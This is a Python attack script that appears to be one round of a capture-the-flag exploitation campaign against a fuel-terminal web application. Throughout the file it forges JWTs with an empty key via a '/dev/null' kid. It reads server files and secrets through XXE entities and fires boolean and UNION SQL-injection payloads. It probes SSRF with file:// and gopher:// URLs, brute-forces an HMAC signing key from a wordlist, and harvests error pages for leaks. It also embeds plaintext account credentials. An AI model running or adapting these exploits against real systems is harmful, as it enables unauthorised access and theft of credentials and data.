#!/usr/bin/env python3
"""round78 — SQLi retry + portal with registered company + HMAC full file content + probe method"""
import requests, json, time, hashlib, hmac as hm, base64

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: HEALTH CHECK")
print("="*70)
healthy = False
for i in range(5):
    try:
        r = requests.get(f"{CASPI}/api/auth/me", headers=AUTH_OP, timeout=8)
        if r.status_code == 200:
            print(f"  Server healthy: {r.text[:100]}")
            healthy = True
            break
    except Exception as e:
        print(f"  Attempt {i+1}: {e}")
    time.sleep(3)

if not healthy:
    print("  *** Server unreachable! Aborting. ***")
    exit(1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: BOOLEAN SQLi RETRY in probe/sign")
print("="*70)
print("  These timed out in round76 due to network issues")

# First baseline
for dev in ["tk-01", "lm-01", "nonexistent"]:
    try:
        r = requests.get(f"{CASPI}/api/ops/probe/sign", params={"device": dev},
                        headers=AUTH_OP, timeout=8)
        print(f"  Baseline {dev}: [{r.status_code}] {r.text[:150]}")
    except Exception as e:
        print(f"  Baseline {dev}: {e}")
    time.sleep(0.3)

print("\n  --- Boolean tests ---")
bool_tests = [
    ("TRUE: tk-01' AND '1'='1", "tk-01' AND '1'='1"),
    ("FALSE: tk-01' AND '1'='2", "tk-01' AND '1'='2"),
    ("OR true: ' OR '1'='1", "' OR '1'='1"),
    ("OR true --: ' OR 1=1--", "' OR 1=1--"),
    ("OR true #: ' OR 1=1#", "' OR 1=1#"),
    ("dbl true: tk-01\" AND \"1\"=\"1", 'tk-01" AND "1"="1'),
    ("dbl false: tk-01\" AND \"1\"=\"2", 'tk-01" AND "1"="2'),
    # UNION retries
    ("UNION url: ' UNION SELECT 'http://127.0.0.1'--", "' UNION SELECT 'http://127.0.0.1:3000/healthz'--"),
    ("UNION all: ' UNION ALL SELECT url FROM devices LIMIT 1--", "' UNION ALL SELECT url FROM devices LIMIT 1--"),
]

for desc, payload in bool_tests:
    start = time.time()
    try:
        r = requests.get(f"{CASPI}/api/ops/probe/sign",
                        params={"device": payload},
                        headers=AUTH_OP, timeout=8)
        elapsed = time.time() - start
        body = r.text[:200].replace('\n', ' ').strip()
        if r.status_code == 200:
            print(f"  *** SQLi HIT! {desc}: [{r.status_code}] {body}")
        elif r.status_code == 500:
            print(f"  [500] {desc}: {body[:80]}")
        elif elapsed > 2:
            print(f"  [{r.status_code}] {desc}: SLOW ({elapsed:.1f}s)")
        else:
            print(f"  [{r.status_code}] {desc}")
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"  *** TIMEOUT {desc}: {elapsed:.1f}s")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: PORTAL WITH REGISTERED COMPANY")
print("="*70)
print("  Previously portal returned 500 with company='X' (not in DB)")
print("  Now testing with our registered company 'CTF_Team_fubznz'")

# Try portal with registered company via cookie
for company, role, sub in [
    ("CTF_Team_fubznz", "carrier", 6077),
    ("CTF_Team_fubznz", "operator", 6077),
    ("CTF_Team_fubznz", "admin", 6077),
]:
    token = jwt_forged(role=role, sub=str(sub), company=company)
    # Try both Bearer and Cookie auth
    for auth_type in ["bearer", "cookie"]:
        if auth_type == "bearer":
            headers = {"Authorization": f"Bearer {token}"}
        else:
            headers = {"Cookie": f"session={token}"}

        try:
            r = requests.get(f"{CASPI}/portal", headers=headers, timeout=8)
            # Check if portal returns 200 and has useful content
            if r.status_code == 200:
                text = r.text
                # Look for interesting content in portal
                if "loading" in text.lower() and "windows" in text.lower():
                    # Check for tickets or schedules
                    if "No loading windows" in text:
                        print(f"  [{r.status_code}] {auth_type} {role}/{company}: Standard empty portal")
                    else:
                        print(f"  *** [{r.status_code}] {auth_type} {role}/{company}: DIFFERENT PORTAL! ***")
                        # Print content between body tags
                        content = text
                        if 'Partner Portal' in content:
                            start_idx = content.find('Partner Portal')
                            print(f"    Content: {content[start_idx:start_idx+500]}")
                else:
                    print(f"  [{r.status_code}] {auth_type} {role}/{company}: {text[:200]}")
            else:
                print(f"  [{r.status_code}] {auth_type} {role}/{company}")
        except Exception as e:
            print(f"  {auth_type} {role}/{company}: {e}")
        time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: CUSTODY TICKET STORAGE TEST")
print("="*70)
print("  Submit ticket with our company, then check portal")

# Submit a custody ticket
ticket_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>CTF-PROBE-001</reference>
  <tankId>T-01</tankId>
  <product>Diesel</product>
  <grossVolume>500</grossVolume>
  <netVolume>495</netVolume>
  <density>0.832</density>
  <temperature>18.5</temperature>
  <carrier>CTF_Team_fubznz</carrier>
  <remarks>Test custody ticket for storage check</remarks>
</ticket>'''

try:
    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
        data=ticket_xml,
        headers={**AUTH_OP, "Content-Type":"application/xml"},
        timeout=10)
    print(f"  Submit ticket: [{r.status_code}] {r.text[:300]}")
except Exception as e:
    print(f"  Submit ticket: {e}")

time.sleep(1)

# Now check portal for stored tickets
token = jwt_forged(role="carrier", sub="6077", company="CTF_Team_fubznz")
try:
    r = requests.get(f"{CASPI}/portal",
                    headers={"Cookie": f"session={token}"}, timeout=8)
    if r.status_code == 200:
        if "CTF-PROBE-001" in r.text:
            print(f"  *** TICKET STORED AND VISIBLE IN PORTAL! ***")
            # Extract the relevant section
            idx = r.text.find("CTF-PROBE-001")
            print(f"  Context: ...{r.text[max(0,idx-200):idx+300]}...")
        elif "No loading windows" in r.text:
            print(f"  Portal: standard empty (no ticket visible)")
        else:
            print(f"  Portal: {r.text[:300]}")
    else:
        print(f"  Portal: [{r.status_code}]")
except Exception as e:
    print(f"  Portal: {e}")

# Also check if there's a custody list endpoint
for path in ["/api/ops/custody/list", "/api/ops/custody/tickets",
             "/api/ops/custody", "/api/ops/tickets"]:
    for method in ["GET", "POST"]:
        try:
            if method == "GET":
                r = requests.get(f"{CASPI}{path}", headers=AUTH_OP, timeout=5)
            else:
                r = requests.post(f"{CASPI}{path}", json={}, headers=AUTH_OP, timeout=5)
            if r.status_code not in [404, 405]:
                print(f"  *** {method} {path}: [{r.status_code}] {r.text[:200]} ***")
        except:
            pass
        time.sleep(0.1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: HMAC WITH FULL FILE CONTENTS AS KEY")
print("="*70)

url1 = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
sig1 = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

# Read db.py and gunicorn.conf.py to get full content
files_to_test = {}

for path in ["/app/db.py", "/app/gunicorn.conf.py", "/etc/hostname",
             "/app/requirements.txt"]:
    code, val = xxe_read(path, timeout=8)
    if code == 200 and val:
        files_to_test[path] = val
        print(f"  Read {path}: {len(val)} bytes")
    time.sleep(0.2)

# Test each file content as HMAC key
for path, content in files_to_test.items():
    # Try with content as-is
    h = hm.new(content.encode(), url1, hashlib.sha256).digest()
    if h == sig1:
        print(f"  *** PROBE_SECRET = content of {path} ***")

    # Try with trailing newline added (file read vs XXE read difference)
    h = hm.new((content + '\n').encode(), url1, hashlib.sha256).digest()
    if h == sig1:
        print(f"  *** PROBE_SECRET = content of {path} + '\\n' ***")

    # Try with content stripped
    h = hm.new(content.strip().encode(), url1, hashlib.sha256).digest()
    if h == sig1:
        print(f"  *** PROBE_SECRET = content of {path} (stripped) ***")

    # Try various encodings
    for encoding in [content.encode('utf-8'), content.encode('ascii', errors='ignore')]:
        h = hm.new(encoding, url1, hashlib.sha256).digest()
        if h == sig1:
            print(f"  *** PROBE_SECRET = {path} content ***")

print(f"  Tested {len(files_to_test)} file contents — no match")

# Also test common CTF secrets and derivatives
more_candidates = [
    # From visible infrastructure
    b"khs-oil-depot",
    b"khs-oil-depot_terminal",
    b"khs_oil_depot",
    b"oil-depot",
    b"oil_depot",
    b"OilDepot",
    b"caspiterminal",
    b"CaspiTerminal",
    b"caspi-terminal",
    b"caspi_terminal",
    b"CASPI_TERMINAL",
    b"gauge-gw",
    b"gauge_gw",
    b"gauge-gw.internal",
    b"gauge-gw.internal:9100",
    # Common CTF patterns
    b"flag",
    b"ctf",
    b"kazhackstan",
    b"KazHackStan",
    b"KAZHACKSTAN",
    b"KHS",
    b"khs",
    b"khs2026",
    b"KHS2026",
    b"KazHackStan2026",
    # Docker/infra
    b"docker",
    b"container",
    b"kubernetes",
    b"k8s",
    # From the response data
    b"loading-arm-1",
    b"gauge",
    b"probe",
    b"terminal_web_pw",
    b"terminal_web",
    # Simple patterns
    b"secret",
    b"supersecret",
    b"mysecret",
    b"probe_secret",
    b"PROBE_SECRET",
    b"hmac_secret",
    b"hmac-secret",
    b"signing_key",
    b"signing-key",
    b"api_key",
    b"api-key",
    b"changeme",
    b"letmein",
    b"admin",
    b"root",
    b"toor",
    b"password",
    b"password123",
    b"test",
    b"test123",
    b"default",
    b"master",
    b"key",
    # Oil themed
    b"crude",
    b"diesel",
    b"petroleum",
    b"brent",
    b"wti",
    b"opec",
    b"barrel",
    b"pipeline",
    b"refinery",
    b"tanker",
    b"custody",
    b"transfer",
    # Kazakhstan themed
    b"astana",
    b"almaty",
    b"aktau",
    b"atyrau",
    b"mangystau",
    b"tengiz",
    b"kashagan",
    b"karachaganak",
    b"caspian",
    b"Caspian",
    b"CASPIAN",
    b"tengizchevroil",
    b"TCO",
    b"tco",
    b"ncoc",
    b"NCOC",
    b"kmg",
    b"KMG",
    b"KazMunayGas",
    b"kazmunaygas",
]

found = False
for candidate in more_candidates:
    h = hm.new(candidate, url1, hashlib.sha256).digest()
    if h == sig1:
        print(f"  *** PROBE_SECRET = {candidate.decode(errors='replace')!r} ***")
        found = True
        break

if not found:
    print(f"  Tested {len(more_candidates)} more candidates — no match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: PROBE WITH METHOD PARAMETER (retry)")
print("="*70)
print("  In round73 these were all 502 (server recovering)")

url_tk01 = "http://gauge-gw.internal:9100/v1/tanks/1/level"
sig_tk01 = "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"

method_tests = [
    ("method POST", {"url": url_tk01, "sig": sig_tk01, "method": "POST"}),
    ("method PUT", {"url": url_tk01, "sig": sig_tk01, "method": "PUT"}),
    ("method HEAD", {"url": url_tk01, "sig": sig_tk01, "method": "HEAD"}),
    ("method DELETE", {"url": url_tk01, "sig": sig_tk01, "method": "DELETE"}),
    ("method OPTIONS", {"url": url_tk01, "sig": sig_tk01, "method": "OPTIONS"}),
    ("headers param", {"url": url_tk01, "sig": sig_tk01, "headers": {"X-Test": "1"}}),
    ("timeout param", {"url": url_tk01, "sig": sig_tk01, "timeout": 1}),
    ("follow param", {"url": url_tk01, "sig": sig_tk01, "follow_redirects": False}),
    ("data param", {"url": url_tk01, "sig": sig_tk01, "data": "test"}),
    ("body param", {"url": url_tk01, "sig": sig_tk01, "body": "test"}),
    ("json param", {"url": url_tk01, "sig": sig_tk01, "json": {"key": "val"}}),
    # Try changing URL scheme
    ("file url", {"url": "file:///app/app.py", "sig": sig_tk01}),
    ("gopher url", {"url": "gopher://127.0.0.1:5432/_SELECT 1", "sig": sig_tk01}),
]

for desc, payload in method_tests:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json=payload,
                         headers=AUTH_OP, timeout=8)
        body = r.text[:200].replace('\n', ' ').strip()
        if r.status_code == 200:
            data = r.json()
            probe_body = data.get("body", "")
            print(f"  *** {desc}: [{r.status_code}] body={probe_body[:200]} ***")
        elif r.status_code != 403:
            print(f"  [{r.status_code}] {desc}: {body[:100]}")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: CREATIVE FILE PATHS — LAST BATCH")
print("="*70)

creative_paths = [
    # Unusual pycache locations
    "/app/__pycache__/secret",
    "/app/__pycache__/probe_secret",
    "/app/__pycache__/config",
    "/app/__pycache__/.env",
    # Alternative app entry points
    "/app/__main__.py",
    "/app/manage.py",
    "/app/wsgi.py",
    "/app/asgi.py",
    "/app/Makefile",
    "/app/Dockerfile",
    "/app/docker-compose.yml",
    "/app/docker-compose.yaml",
    "/app/.dockerignore",
    "/app/Procfile",
    "/app/Pipfile",
    "/app/Pipfile.lock",
    "/app/poetry.lock",
    "/app/pyproject.toml",
    "/app/setup.py",
    "/app/setup.cfg",
    "/app/tox.ini",
    "/app/pytest.ini",
    # Probe related
    "/app/probe_key",
    "/app/keys/probe_secret",
    "/app/keys/.secret",
    "/app/keys/secret",
    "/app/keys/hmac",
    "/app/keys/signing",
    "/app/.keys",
    # Root level
    "/secret",
    "/flag",
    "/probe_secret",
    "/hmac_key",
    # Var locations
    "/var/secret",
    "/var/lib/secret",
    "/var/local/probe",
    "/var/local/hmac",
    "/var/local/secret",
    "/var/local/flag",
    # Etc locations
    "/etc/secret",
    "/etc/probe_secret",
    "/etc/app/secret",
    # Tmp
    "/tmp/secret",
    "/tmp/probe_secret",
    "/tmp/flag",
    "/dev/shm/secret",
    "/dev/shm/probe_secret",
    # Home
    "/home/app/.env",
    "/home/flask/.env",
    "/home/terminal/.env",
]

for path in creative_paths:
    code, val = xxe_read(path, timeout=4)
    if code == 200 and val:
        print(f"  *** FOUND: {path} ({len(val)} bytes): {val[:300]} ***")
    elif code == 400:
        print(f"  EXISTS(400): {path}")
    time.sleep(0.06)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: REGISTERED USER LOGIN — EXTRACT SESSION COOKIE")
print("="*70)
print("  Login with registered creds to get real session JWT")

try:
    r = requests.post(f"{CASPI}/api/auth/login",
        json={"email": "ctf_fubznz@caspiterminal.kz", "password": "Ctffubznz2026!"},
        timeout=8)
    print(f"  Login: [{r.status_code}] {r.text[:200]}")
    if r.status_code == 200:
        cookies = dict(r.cookies)
        print(f"  Cookies: {cookies}")
        if 'session' in cookies:
            session_jwt = cookies['session']
            parts = session_jwt.split('.')
            if len(parts) == 3:
                # Decode header and payload
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                print(f"  JWT Header: {header}")
                print(f"  JWT Payload: {payload}")

                # Now access portal with real session
                r2 = requests.get(f"{CASPI}/portal",
                                 headers={"Cookie": f"session={session_jwt}"},
                                 timeout=8)
                if r2.status_code == 200:
                    # Search for interesting content
                    text = r2.text
                    if "No loading windows" in text:
                        print(f"  Portal (real session): standard empty")
                    else:
                        print(f"  Portal (real session): DIFFERENT!")
                        print(f"  Content: {text[:500]}")
                else:
                    print(f"  Portal (real session): [{r2.status_code}]")
except Exception as e:
    print(f"  Login: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: ERROR RESPONSE ANALYSIS")
print("="*70)
print("  Check 403/500 error pages for info leaks")

# Get full error pages
for test_name, test_req in [
    ("403 probe", lambda: requests.post(f"{CASPI}/api/ops/probe",
        json={"url": "http://test", "sig": "invalid"}, headers=AUTH_OP, timeout=8)),
    ("500 sig=true", lambda: requests.post(f"{CASPI}/api/ops/probe",
        json={"url": url_tk01, "sig": True}, headers=AUTH_OP, timeout=8)),
    ("500 portal X", lambda: requests.get(f"{CASPI}/portal",
        headers={"Authorization": f"Bearer {jwt_forged('carrier', company='X')}"}, timeout=8)),
    ("404 probe/sign", lambda: requests.get(f"{CASPI}/api/ops/probe/sign",
        params={"device": "xxx"}, headers=AUTH_OP, timeout=8)),
]:
    try:
        r = test_req()
        print(f"\n  {test_name}: [{r.status_code}]")
        # Look for anything beyond standard error page
        text = r.text
        # Search for Python traceback, variable names, file paths
        for keyword in ['Traceback', 'File "', 'PROBE', 'SECRET', 'secret',
                       'key', 'hmac', 'environ', '/app/', 'Error']:
            if keyword.lower() in text.lower():
                # Find context around keyword
                idx = text.lower().find(keyword.lower())
                context = text[max(0,idx-50):idx+100]
                print(f"    Found '{keyword}': ...{context}...")
        # Print response headers
        for k, v in r.headers.items():
            if k.lower() not in ['server', 'date', 'content-type', 'content-length', 'connection']:
                print(f"    Header: {k}: {v}")
    except Exception as e:
        print(f"  {test_name}: {e}")
    time.sleep(0.3)

print("\n"+"="*70)
print("DONE")
print("="*70)
